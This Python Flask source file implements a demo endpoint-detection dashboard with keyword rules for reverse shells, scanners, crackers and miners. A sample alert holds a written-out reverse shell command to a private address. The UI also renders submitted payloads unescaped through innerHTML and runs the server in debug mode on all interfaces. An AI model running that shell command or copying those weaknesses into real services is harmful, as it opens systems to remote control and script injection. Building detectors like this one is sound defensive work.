#!/usr/bin/env python3
"""
main2.py - SecurePulse EDR demo with a frontend web UI and interaction APIs.

Run:
  pip install flask
  python main2.py

Then open http://localhost:5000
"""

import sys
import uuid
from datetime import datetime

try:
    from flask import Flask, jsonify, request, render_template_string
except ImportError:
    print("Flask is required. Run: pip install flask")
    sys.exit(1)

app = Flask(__name__)
alerts = []

DEMO_ALERTS = [
    {"alert_id": "A1B2C3D4", "rule_id": "PROC-001", "rule_name": "Reverse Shell", "severity": "HIGH", "risk_score": 90, "description": "Reverse shell command observed", "source_module": "demo", "timestamp": datetime.now().isoformat(), "matched_payload": "bash -i >& /dev/tcp/10.0.0.12/443 0>&1"},
    {"alert_id": "E5F6G7H8", "rule_id": "PROC-002", "rule_name": "Port Scan", "severity": "MEDIUM", "risk_score": 65, "description": "Nmap scan signature seen", "source_module": "demo", "timestamp": datetime.now().isoformat(), "matched_payload": "nmap -sS 10.0.0.0/24"},
]

# Auto-load demo alerts on module import so API has data immediately.
alerts.extend(DEMO_ALERTS)

RULES = [
    {
        "id": "PROC-001",
        "name": "Reverse Shell Detection",
        "severity": "HIGH",
        "score": 90,
        "patterns": ["nc", "netcat", "bash -i", "python -c", "perl -e", "ruby -rsocket", "socat"],
    },
    {
        "id": "PROC-002",
        "name": "Enumeration Tools Detected",
        "severity": "MEDIUM",
        "score": 60,
        "patterns": ["nmap", "masscan", "nikto", "dirb", "gobuster", "enum4linux", "linpeas", "winpeas"],
    },
    {
        "id": "PROC-003",
        "name": "Privilege Escalation Tool",
        "severity": "HIGH",
        "score": 85,
        "patterns": ["sudo -l", "chmod +s", "chown root"],
    },
    {
        "id": "PROC-004",
        "name": "Password Cracking Tool",
        "severity": "HIGH",
        "score": 80,
        "patterns": ["john", "hashcat", "hydra", "medusa", "crunch"],
    },
    {
        "id": "PROC-005",
        "name": "Crypto Miner Detection",
        "severity": "MEDIUM",
        "score": 70,
        "patterns": ["xmrig", "minerd", "cpuminer", "ethminer", "cgminer"],
    },
]

SEVERITY_COLOR = {
    "CRITICAL": "#d32f2f",
    "HIGH": "#f57c00",
    "MEDIUM": "#fbc02d",
    "LOW": "#0288d1",
    "INFO": "#388e3c",
}

PROCESSES = [
    {"pid": 1040, "name": "ssh", "user": "root", "cmd": "sshd: user@pts/0"},
    {"pid": 3420, "name": "nginx", "user": "www-data", "cmd": "nginx: master process /usr/sbin/nginx"},
    {"pid": 6598, "name": "python", "user": "navde", "cmd": "python main2.py"},
    {"pid": 9234, "name": "bash", "user": "navde", "cmd": "bash"},
    {"pid": 7611, "name": "java", "user": "tomcat", "cmd": "/opt/tomcat/bin/java -jar app.war"},
]



def make_alert(rule, payload):
    new_alert = {
        "alert_id": str(uuid.uuid4())[:8].upper(),
        "rule_id": rule["id"],
        "rule_name": rule["name"],
        "severity": rule["severity"],
        "risk_score": rule["score"],
        "description": f"Detected pattern in payload: {payload}",
        "source_module": "UI-Scanner",
        "timestamp": datetime.now().isoformat(),
        "matched_payload": payload,
    }
    alerts.append(new_alert)
    return new_alert


def scan_payload(payload):
    matched = []
    lower = payload.lower()
    for rule in RULES:
        for pattern in rule["patterns"]:
            if pattern.lower() in lower:
                matched.append(make_alert(rule, payload))
                break
    return matched


@app.route("/api/scan", methods=["POST"])
def api_scan():
    data = request.get_json(silent=True) or {}
    payload = data.get("text", "")
    if not payload.strip():
        return jsonify({"error": "Please submit non-empty payload text."}), 400

    findings = scan_payload(payload)
    return jsonify({
        "status": "OK",
        "payload": payload,
        "findings": findings,
        "all_alerts": alerts,
    })


@app.route("/api/alerts")
def api_alerts():
    return jsonify({"alerts": alerts})


@app.route("/api/rules")
def api_rules():
    return jsonify({"rules": RULES})


@app.route("/api/processes")
def api_processes():
    return jsonify({"processes": PROCESSES})


def seed_demo_data():
    if not alerts:
        alerts.extend(DEMO_ALERTS)


@app.route("/")
def index():
    return render_template_string('''<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>SecurePulse EDR Demo</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; background: linear-gradient(135deg, #010a24 0%, #00143b 55%, #000a18 100%); color: #e3eaff; min-height: 100vh; }
    h1 { margin-bottom: 0.15rem; color: #b1d4ff; }
    p { color: #c8dfff; }
    .card { background: rgba(8, 17, 38, 0.88); border: 1px solid rgba(99, 171, 255, 0.25); border-radius: 10px; box-shadow: 0 6px 20px rgba(0, 0, 0, 0.55); padding: 1rem; margin: 1rem 1rem; }
    .button { border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 6px; padding: 0.7rem 1rem; margin: 0.3rem; cursor: pointer; color: #fff; font-weight: 600; transition: transform 0.12s ease, box-shadow 0.12s ease; }
    .button:hover { transform: translateY(-1px); box-shadow: 0 6px 15px rgba(5, 115, 245, 0.35); }
    .button-primary { background: rgb(0, 120, 255); box-shadow: 0 0 16px rgba(0, 170, 255, 0.40); }
    .button-secondary { background: rgb(18, 100, 210); box-shadow: 0 0 14px rgba(40, 175, 255, 0.32); }
    .button-danger { background: rgb(230, 30, 90); box-shadow: 0 0 12px rgba(255, 95, 139, 0.40); }
    textarea, pre { background: rgba(0, 8, 30, 0.88); border: 1px solid rgba(83, 156, 255, 0.65); color: #dbe6ff; border-radius: 7px; }
    textarea:focus, pre:focus { outline: 2px solid rgba(58, 140, 255, 0.85); border-color: rgba(110, 190, 255, 0.75); }
    table { width: 100%; border-collapse: collapse; margin-top: 0.5rem; color: #e4f1ff; }
    th, td { border-bottom: 1px solid rgba(86, 147, 255, 0.35); padding: 0.6rem; text-align: left; }
    th { background: rgba(16, 36, 66, 0.88); color: #b8d8ff; }
  </style>
</head>
<body>
  <h1>SecurePulse EDR – Frontend UI Demo</h1>
  <p>Submit text to scan for suspicious process/command patterns. Detected alerts appear live below.</p>

  <div class="card">
    <div>
      <textarea id="payload" rows="4" style="width:100%; font-family:monospace; font-size:0.95rem;" placeholder="Enter process command, shell history, or network string..."></textarea>
    </div>
    <div>
      <button class="button button-primary" onclick="scan()">Scan payload</button>
      <button class="button button-secondary" onclick="loadAlerts()">Refresh alerts</button>
      <button class="button button-danger" onclick="clearAlerts()">Clear alerts</button>
    </div>
    <div id="message" style="margin-top:0.25rem;"></div>
  </div>

  <div class="card">
    <h2>Live results</h2>
    <div id="results">No scans yet.</div>
  </div>

  <div class="card">
    <h2>Alerts history</h2>
    <div id="alerts">Loading...</div>
  </div>

  <div class="card">
    <h2>Running processes</h2>
    <p style="margin: 0.2rem 0 0.8rem; color:#a8c3ff;">Demo active workload and process list.</p>
    <div id="processes">Loading...</div>
  </div>

  <div class="card">
    <h2>Detection rules</h2>
    <pre id="rules" style="white-space: pre-wrap; font-size:0.95rem;"></pre>
  </div>

<script>
async function scan() {
  const text = document.getElementById('payload').value.trim();
  const msg = document.getElementById('message');
  const output = document.getElementById('results');
  if (!text) {
    output.innerHTML = '';
    msg.textContent = 'Please enter text to scan.';
    msg.style.color = 'crimson';
    return;
  }
  msg.textContent = 'Scanning...';
  msg.style.color = '#a8d2ff';
  output.innerHTML = '<p style="color:#a8d2ff;">Checking payload ...</p>';

  try {
    const resp = await fetch('/api/scan', {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text })
    });
    const data = await resp.json();
    if (!resp.ok) throw new Error(data.error || 'Scan failed');

    console.log('Scan response', data);
    const found = data.findings || [];

    if (!found.length) {
      output.innerHTML = '<p style="color:lightgreen;">No suspicious signatures matched.</p>';
    } else {
      output.innerHTML = '<p style="color:#ffd966;">Found ' + found.length + ' matching rule(s).</p>' +
        found.map(x => '<div><strong>' + x.rule_name + '</strong> (' + x.severity + ') - ' + x.matched_payload + '</div>').join('');
    }

    msg.textContent = 'Scan complete.';
    msg.style.color = 'lime';
    await loadAlerts();

    if (!found.length) {
      msg.textContent = 'No new alerts were created.';
      msg.style.color = '#49b642';
    } else {
      msg.textContent = 'Alerts updated in history section.';
      msg.style.color = '#ffd966';
    }
  } catch (err) {
    console.error('Scan error', err);
    msg.textContent = 'Error: ' + (err.message || 'Failed to scan');
    msg.style.color = 'crimson';
  }
}

async function loadAlerts() {
  const out = document.getElementById('alerts');
  out.innerHTML = '<p style="color: #8ccfff;">Loading alerts...</p>';
  try {
    const resp = await fetch('/api/alerts');
    const data = await resp.json();
    const list = Array.isArray(data.alerts) ? data.alerts : [];

    if (!list.length) {
      out.innerHTML = '<p>No alerts currently.</p>';
      return;
    }

    let html = '<table><tr><th>ID</th><th>Rule</th><th>Severity</th><th>Time</th><th>Payload</th></tr>';
    for (const a of list) {
      html += `<tr><td>${a.alert_id}</td><td>${a.rule_name}</td><td>${a.severity}</td><td>${new Date(a.timestamp).toLocaleTimeString()}</td><td>${a.matched_payload}</td></tr>`;
    }
    html += '</table>';
    out.innerHTML = html;
  } catch (err) {
    console.error('loadAlerts failed', err);
    out.innerHTML = '<p style="color:crimson;">Error loading alerts. Open browser console for details.</p>';
  }
}

async function clearAlerts() {
  if (!confirm('Clear all alerts?')) return;
  const resp = await fetch('/api/clear', { method: 'POST' });
  const data = await resp.json();
  if (data.status === 'cleared') {
    document.getElementById('results').innerHTML = '<em>Alerts cleared.</em>';
    await loadAlerts();
    document.getElementById('message').textContent = 'Alert store cleared.';
    document.getElementById('message').style.color = 'lightblue';
  } else {
    document.getElementById('message').textContent = 'Clear endpoint failed.';
    document.getElementById('message').style.color = 'crimson';
  }
}

async function loadRules() {
  const resp = await fetch('/api/rules');
  const data = await resp.json();
  const rules = data.rules || [];
  const target = document.getElementById('rules');
  target.textContent = rules.map(r => `${r.id} | ${r.name} | ${r.severity} | patterns: ${r.patterns.join(', ')}`).join('\n');
}

async function loadProcesses() {
  const out = document.getElementById('processes');
  out.innerHTML = 'Loading process scan...';
  const resp = await fetch('/api/processes');
  const data = await resp.json();
  const list = data.processes || [];
  if (!list.length) {
    out.innerHTML = '<p>No processes found.</p>';
    return;
  }
  let html = '<table><tr><th>PID</th><th>Name</th><th>User</th><th>Command</th></tr>';
  for (const p of list) {
    html += `<tr><td>${p.pid}</td><td>${p.name}</td><td>${p.user}</td><td>${p.cmd}</td></tr>`;
  }
  html += '</table>';
  out.innerHTML = html;
}

window.onload = function() {
  loadAlerts();
  loadRules();
  loadProcesses();
};
</script>
</body>
</html>
''')


@app.route('/api/clear', methods=['POST'])
def api_clear():
    alerts.clear()
    return jsonify({'status': 'cleared'})


if __name__ == '__main__':
    seed_demo_data()
    print('Starting SecurePulse EDR frontend at http://localhost:5000')
    app.run(host='0.0.0.0', port=5000, debug=True)
